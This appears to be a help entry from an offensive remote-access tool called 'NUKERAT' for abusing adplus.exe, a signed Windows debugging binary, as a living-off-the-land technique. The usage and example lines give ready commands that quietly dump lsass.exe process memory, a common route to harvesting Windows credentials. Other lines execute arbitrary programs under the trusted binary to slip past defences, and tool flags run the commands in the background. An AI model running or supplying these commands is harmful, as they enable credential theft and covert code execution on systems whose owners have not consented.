ABOUT
    Debugging tool included with Windows Debugging Tools. LOLBAS covers
    create memory dump and parse it offline and running commands under a
    trusted Microsoft-signed binary.

USAGE:
    adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
    adplus.exe -c {PATH:.xml}
    adplus.exe -crash -o "{PATH_ABSOLUTE:folder}" -sc {PATH:.exe}

EXAMPLES:
    adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
    adplus.exe -c {PATH:.xml}
    adplus.exe -crash -o "{PATH_ABSOLUTE:folder}" -sc {PATH:.exe}

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
